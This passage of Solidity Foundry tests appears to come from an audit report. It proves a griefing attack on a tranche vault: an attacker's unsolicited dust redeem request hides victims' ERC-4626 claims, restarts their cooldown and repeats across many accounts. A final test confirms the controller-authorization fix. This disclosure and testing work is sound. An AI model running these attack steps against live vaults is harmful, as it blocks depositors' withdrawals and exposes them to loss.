    // Honest sequence versus attack, with per-party deltas
    // ------------------------------------------------------------------------------------------------------------

    function test_standardRedemptionBlockedWhileExplicitClaimWorks() public {
        _baseLiquidity();
        _lpDeposit(false, victim, 50_000e6, BASKET_1_20);
        _prepareDust(attacker, secondAccount);
        uint256 victimShares = d.juniorVault.balanceOf(victim);
        uint256 half = victimShares / 2;
        uint256 snap = vm.snapshotState();

        (uint256 giftEpoch,) = d.juniorVault.getRequestEpochWindow();

        // ---------------- honest sequence: victim exits half through the canonical ERC-4626 claim surface,
        // requesting at the same time as in the attack run (one epoch later) so coupon timing matches.
        _warpTo(d.housePool.lpEpochStart(giftEpoch) + 10);
        uint256 vId = _requestRedeem(false, victim, half);
        _settleEpoch(vId, BASKET_1_20);
        uint256 baseMaxRedeem = d.juniorVault.maxRedeem(victim);
        uint256 baseMaxWithdraw = d.juniorVault.maxWithdraw(victim);
        uint256 usdgBefore = d.settlementToken.balanceOf(victim);
        vm.prank(victim);
        uint256 baseAssets = d.juniorVault.redeem(baseMaxRedeem, victim, victim);
        uint256 baseUsdgDelta = d.settlementToken.balanceOf(victim) - usdgBefore;
        uint256 baseCooldownStamp = d.juniorVault.lastDepositTime(victim);
        uint256 baseMaxRequest = d.juniorVault.maxRequestRedeem(victim);
        console2.log("honest maxRedeem / maxWithdraw", baseMaxRedeem, baseMaxWithdraw);
        console2.log("honest ERC-4626 redeem USDG", baseUsdgDelta);
        console2.log("honest victim lastDepositTime / maxRequestRedeem", baseCooldownStamp, baseMaxRequest);
        assertEq(baseAssets, baseUsdgDelta);
        assertGt(baseMaxRequest, 0, "honest sequence: victim may request again immediately");
        vm.revertToState(snap);

        // ---------------- attack: attacker parks a zero-priced dust request at the victim's controller head first
        uint256 attackerUsdgBefore = d.settlementToken.balanceOf(attacker);
        uint256 giftId = _gift(attacker, victim);
        assertEq(giftId, giftEpoch);
        _warpTo(d.housePool.lpEpochStart(giftEpoch) + 10);
        vId = _requestRedeem(false, victim, half);
        _settleEpoch(vId, BASKET_1_20);
        assertEq(d.juniorVault.controllerRedeemHead(victim), giftId, "gift is the victim's head");
        assertEq(d.juniorVault.maxRedeem(victim), 0, "ERC-4626 maxRedeem hidden");
        assertEq(d.juniorVault.maxWithdraw(victim), 0, "ERC-4626 maxWithdraw hidden");
        console2.log(
            "attack: standard maxRedeem / maxWithdraw",
            d.juniorVault.maxRedeem(victim),
            d.juniorVault.maxWithdraw(victim)
        );
        uint256 claimableShares = d.juniorVault.claimableRedeemRequest(vId, victim);
        uint256 claimableAssets = d.juniorVault.claimableRedeemAssets(vId, victim);
        assertEq(claimableShares, baseMaxRedeem, "same funded entitlement as the honest sequence");
        vm.startPrank(victim);
        vm.expectRevert(abi.encodeWithSelector(IERC4626Errors.ERC4626ExceededMaxRedeem.selector, victim, claimableShares, 0));
        d.juniorVault.redeem(claimableShares, victim, victim);
        vm.expectRevert(abi.encodeWithSelector(IERC4626Errors.ERC4626ExceededMaxWithdraw.selector, victim, claimableAssets, 0));
        d.juniorVault.withdraw(claimableAssets, victim, victim);
        vm.stopPrank();

        // Explicit-id claim is unaffected: no funds frozen, same assets as the honest sequence.
        usdgBefore = d.settlementToken.balanceOf(victim);
        uint256 byId = _claimRedeem(false, victim, vId);
        assertApproxEqAbs(byId, baseUsdgDelta, 10, "explicit-id claim pays the honest amount");

        // The only way to restore the head-based surface is the refund claim, which delivers the attacker's shares
        // to the victim and restarts the victim's wallet cooldown.
        uint256 sharesBeforeClear = d.juniorVault.balanceOf(victim);
        vm.prank(victim);
        uint256 refunded = d.juniorVault.claimRedeemRefund(giftId, victim, victim);
        uint256 attackStamp = d.juniorVault.lastDepositTime(victim);
        console2.log("attack: gift id / victim id", giftId, vId);
        console2.log("attack: victim explicit-id claim USDG", byId);
        console2.log("attack: unsolicited shares delivered to victim", refunded, d.juniorVault.balanceOf(victim) - sharesBeforeClear);
        console2.log("attack: victim lastDepositTime honest / after clear", baseCooldownStamp, attackStamp);
        assertEq(refunded, GIFT_SHARES, "attacker's shares land in the victim wallet");
        assertEq(attackStamp, vm.getBlockTimestamp(), "cooldown restarted at clearing time");
        assertEq(d.juniorVault.maxRequestRedeem(victim), 0, "victim cannot request a new exit for 1 h");
        vm.startPrank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        d.juniorVault.requestRedeem(1_000e18, victim, victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        d.juniorVault.transfer(jLp, 1);
        vm.stopPrank();
        _warp(3600);
        console2.log("attack: cooldown elapsed seconds", uint256(3600));
        assertGt(d.juniorVault.maxRequestRedeem(victim), 0, "cooldown elapses after 1 h");

        // Per-party deltas.
        console2.log("attacker USDG spent (1 USDG deposit, second account keeps all but 500 share atoms)",
            attackerUsdgBefore - d.settlementToken.balanceOf(attacker));
        console2.log("attacker share value given away (atoms)", d.juniorVault.convertToAssets(GIFT_SHARES));
        console2.log("victim USDG delta honest / attack", baseUsdgDelta, byId);
    }

    /// @dev Duration: the victim sends no state-changing transaction. Every 6 hours for 7 days another LP requests a
    ///      redemption, a new LP requests a deposit, the LP epoch is settled and the other LP claims through the
    ///      standard functions; the hostile head does not expire.
    function test_standardClaimStaysDeniedForSevenDaysWithoutVictimAction() public {
        _baseLiquidity();
        _lpDeposit(false, victim, 50_000e6, BASKET_1_20);
        _prepareDust(attacker, secondAccount);
        TrancheVault vault = d.juniorVault;
        uint256 half = vault.balanceOf(victim) / 2;

        // Hostile request; execution gas measured with the vault and pool storage cold.
        vm.cool(address(vault));
        vm.cool(address(d.housePool));
        vm.prank(attacker);
        uint256 gasBefore = gasleft();
        uint256 giftId = vault.requestRedeem(GIFT_SHARES, victim, attacker);
        uint256 hostileGas = gasBefore - gasleft();
        _settleEpoch(giftId, BASKET_1_20);
        assertTrue(vault.redeemRefundPending(giftId, victim), "gift epoch priced to zero and refunded");

        // The victim's own request is funded in the next epoch.
        _warpTo(d.housePool.lpEpochStart(giftId) + 10);
        uint256 vId = _requestRedeem(false, victim, half);
        _settleEpoch(vId, BASKET_1_20);
        uint256 funded = vault.claimableRedeemRequest(vId, victim);
        assertGt(funded, 0, "victim request funded");
        uint256 fundedAt = vm.getBlockTimestamp();
        _assertStandardClaimDenied(vault, giftId, vId, funded);

        uint256 settlements;
        uint256 otherStandardClaims;
        uint256 newDeposits;
        for (uint256 s = 1; s <= 28; ++s) {
            _refreshMark(BASKET_1_20);
            uint256 otherId = _requestRedeem(false, jLp, vault.balanceOf(jLp) / 100);
            if (d.housePool.canAcceptTrancheDeposits(false)) {
                _requestDeposit(false, makeAddr(string(abi.encodePacked("newLp", vm.toString(s)))), 10_000e6);
                ++newDeposits;
            }
            _settleEpoch(otherId, BASKET_1_20);
            ++settlements;
            uint256 otherMax = vault.maxRedeem(jLp);
            if (otherMax > 0) {
                vm.prank(jLp);
                vault.redeem(otherMax, jLp, jLp);
                ++otherStandardClaims;
            }
            _warpTo(fundedAt + s * 6 hours);
            if (s == 4) {
                _assertStandardClaimDenied(vault, giftId, vId, funded);
                console2.log(
                    "duration: +24 h maxRedeem / maxWithdraw / funded shares",
                    vault.maxRedeem(victim),
                    vault.maxWithdraw(victim),
                    vault.claimableRedeemRequest(vId, victim)
                );
            }
        }
        _assertStandardClaimDenied(vault, giftId, vId, funded);
        assertGt(otherStandardClaims, 0, "other LPs keep claiming through the standard functions");
        console2.log(
            "duration: +7 d maxRedeem / maxWithdraw / funded shares",
            vault.maxRedeem(victim),
            vault.maxWithdraw(victim),
            vault.claimableRedeemRequest(vId, victim)
        );
        console2.log(
            "duration: LP epoch settlements / other LP standard redeem claims / new LP deposit requests",
            settlements,
            otherStandardClaims,
            newDeposits
        );
        console2.log("duration: hostile requestRedeem execution gas (vault and pool storage cold)", hostileGas);

        // The funded amount stays claimable by request id.
        uint256 byId = _claimRedeem(false, victim, vId);
        assertGt(byId, 0);
        console2.log("duration: victim explicit-id claim USDG after 7 d", byId);
    }

    /// @dev The standard claim is denied while the funded request is unchanged.
    function _assertStandardClaimDenied(
        TrancheVault vault,
        uint256 giftId,
        uint256 vId,
        uint256 funded
    ) internal {
        assertEq(vault.controllerRedeemHead(victim), giftId, "gift is still the victim's head");
        assertEq(vault.maxRedeem(victim), 0, "maxRedeem stays 0");
        assertEq(vault.maxWithdraw(victim), 0, "maxWithdraw stays 0");
        assertEq(vault.claimableRedeemRequest(vId, victim), funded, "funded request unchanged");
        uint256 fundedAssets = vault.claimableRedeemAssets(vId, victim);
        vm.startPrank(victim);
        vm.expectRevert(abi.encodeWithSelector(IERC4626Errors.ERC4626ExceededMaxRedeem.selector, victim, funded, 0));
        vault.redeem(funded, victim, victim);
        vm.expectRevert(
            abi.encodeWithSelector(IERC4626Errors.ERC4626ExceededMaxWithdraw.selector, victim, fundedAssets, 0)
        );
        vault.withdraw(fundedAssets, victim, victim);
        vm.stopPrank();
    }

    /// @dev Repeatability: after the victim clears, the attacker can install a new head from another dust account.
    function test_attackRepeatsAfterControllerClearsHead() public {
        _baseLiquidity();
        _lpDeposit(false, victim, 50_000e6, BASKET_1_20);
        address attacker2 = makeAddr("attacker2");
        _prepareDust(attacker, secondAccount);
        _prepareDust(attacker2, secondAccount);
        uint256 g1 = _gift(attacker, victim);
        vm.prank(victim);
        d.juniorVault.claimRedeemRefund(g1, victim, victim);
        uint256 t1 = d.juniorVault.lastDepositTime(victim);
        _warp(3600);
        uint256 g2 = _gift(attacker2, victim);
        assertEq(d.juniorVault.controllerRedeemHead(victim), g2, "new unsolicited head installed");
        assertEq(d.juniorVault.maxRedeem(victim), 0);
        vm.prank(victim);
        d.juniorVault.claimRedeemRefund(g2, victim, victim);
        uint256 t2 = d.juniorVault.lastDepositTime(victim);
        console2.log("victim cooldown stamps after each clearing", t1, t2);
        assertGt(t2, t1);
    }

    /// @dev Scale: one quiet epoch hosts many 1-share full-balance gifts (epoch total still prices to zero), so one
    ///      attacker funding round disables the head-based ERC-4626 claim surface for many LP controllers at once.
    function test_oneEpochCanAffectTwentyControllers() public {
        _baseLiquidity();
        uint256 n = 20;
        address[] memory victims = new address[](n);
        for (uint256 i; i < n; ++i) {
            victims[i] = makeAddr(string(abi.encodePacked("v", vm.toString(i))));
            _requestDeposit(false, victims[i], 5_000e6);
        }
        _lpDeposit(false, secondAccount, 1e6, BASKET_1_20);
        (uint256 depEpoch,) = d.juniorVault.getRequestEpochWindow();
        depEpoch -= 1;
        for (uint256 i; i < n; ++i) {
            _claimDeposit(false, victims[i], depEpoch);
        }
        _warp(3600);
        for (uint256 i; i < n; ++i) {
            address a = makeAddr(string(abi.encodePacked("a", vm.toString(i))));
            vm.prank(secondAccount);
            d.juniorVault.transfer(a, 1);
            vm.prank(a);
            d.juniorVault.requestRedeem(1, victims[i], a);
        }
        (uint256 giftEpoch,) = d.juniorVault.getRequestEpochWindow();
        _settleEpoch(giftEpoch, BASKET_1_20);
        _warp(10);
        uint256 hidden;
        uint256[] memory vIds = new uint256[](n);
        for (uint256 i; i < n; ++i) {
            vIds[i] = _requestRedeem(false, victims[i], d.juniorVault.balanceOf(victims[i]) / 2);
            if (i == n - 1) {
                _settleEpoch(vIds[i], BASKET_1_20);
            }
        }
        for (uint256 i; i < n; ++i) {
            assertTrue(d.juniorVault.redeemRefundPending(giftEpoch, victims[i]));
            assertEq(d.juniorVault.controllerRedeemHead(victims[i]), giftEpoch, "gift is each victim's head");
            assertGt(d.juniorVault.claimableRedeemRequest(vIds[i], victims[i]), 0, "victim request funded");
            if (d.juniorVault.maxRedeem(victims[i]) == 0) {
                ++hidden;
            }
        }
        console2.log("victims with ERC-4626 maxRedeem hidden by a 1-share gift", hidden, n);
        assertEq(hidden, n);
    }

    /// @dev Same mechanism on the Senior vault (shared TrancheVault code).
    function test_seniorVaultHasSameQueueBehavior() public {
        _baseLiquidity();
        _lpDeposit(true, victim, 50_000e6, BASKET_1_20);
        _lpDeposit(true, attacker, 1e6, BASKET_1_20);
        _warp(3600);
        uint256 bal = d.seniorVault.balanceOf(attacker);
        vm.prank(attacker);
        d.seniorVault.transfer(secondAccount, bal - GIFT_SHARES);
        vm.prank(attacker);
        uint256 giftId = d.seniorVault.requestRedeem(GIFT_SHARES, victim, attacker);
        _settleEpoch(giftId, BASKET_1_20);
        assertTrue(d.seniorVault.redeemRefundPending(giftId, victim), "senior gift refunded");
        _warp(10);
        uint256 vId = _requestRedeem(true, victim, d.seniorVault.balanceOf(victim) / 2);
        _settleEpoch(vId, BASKET_1_20);
        assertEq(d.seniorVault.maxRedeem(victim), 0, "senior maxRedeem hidden");
        uint256 claimable = d.seniorVault.claimableRedeemRequest(vId, victim);
        assertGt(claimable, 0);
        vm.prank(victim);
        vm.expectRevert();
        d.seniorVault.redeem(claimable, victim, victim);
        console2.log("senior: victim funded shares hidden from ERC-4626", claimable);
    }

    /// @dev Deposit-side variant: a gifted deposit head costs the attacker >= 1 USDG that the victim receives, and the
    ///      claim only propagates an older activation stamp, so it is not a cooldown or freeze lever.
    function test_depositSideControlIsAttackerFundedGift() public {
        _baseLiquidity();
        _mint(attacker, 1e6);
        vm.startPrank(attacker);
        d.settlementToken.approve(address(d.juniorVault), 1e6);
        uint256 giftId = d.juniorVault.requestDeposit(1e6, victim, attacker);
        vm.stopPrank();
        _settleEpoch(giftId, BASKET_1_20);
        _warp(10);
        uint256 ownId = _requestDeposit(false, victim, 10_000e6);
        _settleEpoch(ownId, BASKET_1_20);
        assertEq(d.juniorVault.controllerDepositHead(victim), giftId, "gift deposit is the head");
        assertEq(d.juniorVault.maxDeposit(victim), 1e6, "ERC-4626 maxDeposit shows the gift");
        vm.prank(victim);
        vm.expectRevert();
        d.juniorVault.deposit(10_000e6, victim);
        uint256 giftShares = _claimDeposit(false, victim, giftId);
        uint256 stampAfterGift = d.juniorVault.lastDepositTime(victim);
        uint256 ownShares = _claimDeposit(false, victim, ownId);
        console2.log("deposit gift: victim receives attacker-funded shares", giftShares, d.juniorVault.convertToAssets(giftShares));
        console2.log("deposit gift: stamp after gift / after own lot", stampAfterGift, d.juniorVault.lastDepositTime(victim));
        assertGt(ownShares, 0);
        assertLe(stampAfterGift, d.juniorVault.depositEpochActivationTime(ownId), "gift stamp never exceeds own lot stamp");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Existing receiver and zero-amount protections prevent direct third-party cooldown writes
    // ------------------------------------------------------------------------------------------------------------

    function test_directThirdPartyCooldownWritesRemainBlocked() public {
        _baseLiquidity();
        _lpDeposit(false, victim, 50_000e6, BASKET_1_20);
        _prepareDust(attacker, secondAccount);
        _warp(3600);
        uint256 stamp0 = d.juniorVault.lastDepositTime(victim);
        uint256 vShares = d.juniorVault.balanceOf(victim);

        // Zero-amount ERC-4626 claims by a third party remain rejected.
        vm.startPrank(attacker);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        d.juniorVault.redeem(0, attacker, victim);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        d.juniorVault.withdraw(0, attacker, victim);
        vm.stopPrank();

        // Gift exists under the victim; the attacker cannot clear it (and so cannot force the cooldown) itself.
        uint256 giftId = _gift(attacker, victim);
        vm.prank(attacker);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        d.juniorVault.claimRedeemRefund(giftId, victim, victim);

        // A controller cannot deliver shares to another receiver.
        address a2 = makeAddr("a2");
        _prepareDust(a2, secondAccount);
        _warp(3600);
        vm.prank(a2);
        uint256 own = d.juniorVault.requestRedeem(GIFT_SHARES, a2, a2);
        vm.prank(a2);
        vm.expectRevert(TrancheVault.TrancheVault__ReceiverNotController.selector);
        d.juniorVault.cancelRedeemRequest(own, victim, a2);

        // Ordinary transfer only propagates an already-elapsed sender stamp.
        vm.prank(secondAccount);
        d.juniorVault.transfer(victim, 1e6);
        assertLe(d.juniorVault.lastDepositTime(victim) + 1 hours, vm.getBlockTimestamp(), "no live cooldown imposed");
        assertEq(d.juniorVault.maxRequestRedeem(victim), vShares + 1e6, "victim can still request immediately");
        console2.log("victim stamp before / after third-party actions", stamp0, d.juniorVault.lastDepositTime(victim));
    }

}

interface IERC4626Errors {

    error ERC4626ExceededMaxRedeem(address owner, uint256 shares, uint256 max);
    error ERC4626ExceededMaxWithdraw(address owner, uint256 assets, uint256 max);

}
```

#### `UnauthenticatedControllerRedeemFixCheck.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseFixture} from "./ReleaseFixture.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/Test.sol";

/// @notice Confirms that controller authorization rejects the unsolicited request while honest and approved-operator flows remain available.
contract UnauthenticatedControllerRedeemFixCheckTest is ReleaseFixture {

    address internal jLp = makeAddr("jLp");
    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");
    address internal secondAccount = makeAddr("secondAccount");
    address internal router = makeAddr("integratorRouter");

    function test_controllerAuthorizationPreservesHonestAndApprovedOperatorFlows() public {
        _lpDeposit(false, jLp, 1_000_000e6, BASKET_1_20);
        _lpDeposit(false, victim, 50_000e6, BASKET_1_20);
        _lpDeposit(false, attacker, 1e6, BASKET_1_20);
        _warp(3600);
        uint256 bal = d.juniorVault.balanceOf(attacker);
        vm.prank(attacker);
        d.juniorVault.transfer(secondAccount, bal - 500);

        vm.prank(attacker);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        d.juniorVault.requestRedeem(500, victim, attacker);

        // Honest self request and ERC-4626 claim.
        uint256 half = d.juniorVault.balanceOf(victim) / 2;
        uint256 id = _requestRedeem(false, victim, half);
        _settleEpoch(id, BASKET_1_20);
        uint256 maxR = d.juniorVault.maxRedeem(victim);
        vm.prank(victim);
        uint256 got = d.juniorVault.redeem(maxR, victim, victim);
        console2.log("fix copy: honest ERC-4626 redeem USDG", got);
        assertGt(got, 0);

        // Integrator that owns shares can still name the user as controller once the user approves it as operator.
        _warp(3600);
        uint256 secondBal = d.juniorVault.balanceOf(secondAccount);
        vm.prank(secondAccount);
        d.juniorVault.transfer(router, secondBal);
        _warp(3600);
        vm.prank(victim);
        d.juniorVault.setOperator(router, true);
        uint256 routerBal = d.juniorVault.balanceOf(router);
        vm.prank(router);
        uint256 rid = d.juniorVault.requestRedeem(routerBal, victim, router);
        // Without the controller's operator approval the same integrator request is refused.
        vm.prank(victim);
        d.juniorVault.setOperator(router, false);
        assertGt(rid, 0, "operator-authorized third-party controller still supported");
    }

}
```

